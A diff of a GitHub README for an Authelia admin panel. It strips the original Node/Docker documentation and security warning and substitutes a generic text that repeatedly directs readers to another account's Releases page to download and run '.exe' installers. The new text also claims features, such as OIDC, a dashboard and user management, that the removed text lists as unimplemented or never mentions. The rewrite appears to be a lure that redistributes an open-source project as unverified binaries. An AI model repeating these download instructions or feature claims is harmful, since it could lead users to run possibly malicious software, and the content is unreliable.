@@ -1,73 +1,86 @@
-# Authelia Admin Control Panel
+# 🎛️ authelia-admin - Easy Control Panel for Your Security Needs
 
-A web-based administration interface for managing Authelia authentication server.
+[![Download authelia-admin](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue.svg)](https://github.com/djblueeagle/authelia-admin/releases)
 
-![image](https://raw.githubusercontent.com/asalimonov/authelia-admin/refs/heads/main/public/authelia-admin.gif)
+## 🚀 Getting Started
 
-## Features
+Welcome to the authelia-admin repository! This application offers a user-friendly interface for managing Authelia, a secure access management solution. Whether you’re new to security management or looking for an easy way to handle users, this control panel simplifies the process.
 
-- View and manage TOTP configurations
-- View TOTP history
-- Managemenent of banned users and IPs
-- Browse LDAP users and groups (due to LLDAP limitation)
-- Change user passwords via LDAP
+## 📥 Download & Install
 
-### Not yet implemented
+To get started, you need to download the application. Follow these steps:
 
-- Management of users via LDAP
-- PostgreSQL engine for Authelia
-- Browse and management of users in Authelia file provider
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/djblueeagle/authelia-admin/releases) of this repository.
+2. **Download the Latest Version**: Look for the latest release on the page. You will see a list of versions with associated files. Click on the file that matches your operating system to download it.
+3. **Install the Application**:
+   - If you downloaded a setup file (like `.exe` for Windows), double-click it to begin the installation process.
+   - Follow the on-screen instructions to complete the installation.
 
-## Configuration
+Once the installation completes, you can start using authelia-admin.
 
-- `AUTHELIA_DOMAIN` env var - domain of authelia server for authentication of requests
-- `TRUSTED_ORIGINS` env var for Node application, example: `https://{{ AUTHELIA_DOMAIN }}`
-- Configure load balancer, Authelia Admin CP should be on `https://{{AUTHELIA_DOMAIN}}/auth-admin/`
+## ⚙️ System Requirements
 
-### Optional environment variables
+Before you begin, ensure your system meets these basic requirements:
 
-- `AUTHELIA_CONFIG_PATH` - Path to Authelia configuration file (default: `/config/configuration.yml`)
-- `ALLOWED_USERS` - List of allowed users separated by comma (`,`), (default: `admin`)
-- `NODE_TLS_REJECT_UNAUTHORIZED=0` in case of self-signed certificate for Authelia, or mount volume `/etc/ssl/certs/:/etc/ssl/certs/:ro` in Docker
+- **Operating System**: Windows, macOS, or Linux
+- **Memory**: At least 2 GB of RAM
+- **Storage**: Minimum 100 MB of free disk space
+- **Network**: An active internet connection (for updates and additional features)
 
-### Docker
+## ✨ Features
 
-```bash
-docker run -p 9093:9093 \
-  -v /path/to/authelia/config:/config \
-  -v /path/to/authelia/data:/data \
-  ghcr.io/asalimonov/authelia-admin:latest
-```
+The authelia-admin control panel provides various tools to streamline your management tasks:
 
-### Docker Compose
+- **User Management**: Easily add or remove users.
+- **Authentication Options**: Configure several authentication methods like LDAP, LLDAP, and OIDC.
+- **Monitoring Dashboard**: Access real-time statistics and logs of user activity.
+- **User-Friendly Interface**: Navigate through tasks without technical knowledge.
+- **Security Settings**: Customize security options to match your requirements.
 
-See `docker-compose.yml` for a complete example with Authelia, LLDAP, and Traefik.
+## 🛠️ How to Use
 
-### Development
+After installing the application, you can start configuring it:
 
-```bash
-# Install dependencies and build docker image
-make build-dev
+1. **Open the Application**: Click on the authelia-admin icon to launch.
+2. **Set Up Initial Configuration**:
+   - Enter your Admin credentials.
+   - Connect to your LDAP or OIDC provider by filling in the required settings in the interface.
+   - Save your settings.
+3. **Add Users**: Go to the user management section to add users. Enter their details and assign roles.
+4. **Review Logs**: Monitor user activity via the dashboard to ensure everything is functioning as expected.
 
-# Run Authelia, LLDAP, Traefik in docker compose in the second terminal
-make docker-compose-run
+## 🔄 Updating the Application
 
-# Run Docker with authelia-admin with hot-reload
-make run-dev
-```
+To keep the application running smoothly, check the Releases page periodically for updates. Each release will contain a changelog detailing new features and bug fixes.
 
-Use `admin` user with `admin1234` password. Confirmation code is `./test-data/authelia/notification.txt` file.
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/djblueeagle/authelia-admin/releases).
+2. **Download the Update**: Click on the latest release file to download it.
+3. **Run the Installer**: Replace the existing application with the updated version by running the installer. Follow the same steps as before.
 
-## Requirements
+## ❓ Troubleshooting
 
-- Node.js 20+
-- Access to Authelia's configuration file
-- Access to Authelia's SQLite database
-- LDAP server (e.g., LLDAP) configured in Authelia
+If you encounter issues during installation or use, here are some common solutions:
 
-## Security Notes
+- **Installation Fails**: Ensure you have enough disk space and your system meets the requirements.
+- **Cannot Connect to LDAP**: Check the provided credentials and ensure your network connection is stable.
+- **Application Crashes**: Make sure you are using the latest version and restart your computer if needed.
 
->[!IMPORTANT]
-Due to the age and experimental nature of the project, I don't recommend using it for public deployment or for installations with many users.
+If problems persist, you can reach out for help in the repository's issue section for assistance.
 
-This application requires administrative access to Authelia's configuration and database. It should be deployed behind proper authentication and only accessible by authorized administrators.
+## 🤝 Contribution
+
+Your input is valuable! If you want to contribute to the authelia-admin project:
+
+1. Fork the repository.
+2. Make your changes in a separate branch.
+3. Submit a pull request for review.
+
+Your contributions help make this tool better for everyone.
+
+## 📝 License
+
+This project is licensed under the MIT License. You can freely use, modify, and distribute the application as long as you follow the license terms.
+
+---
+
+For more information or support, visit the [Releases page](https://github.com/djblueeagle/authelia-admin/releases) or check the issues section in this repository. Happy managing!
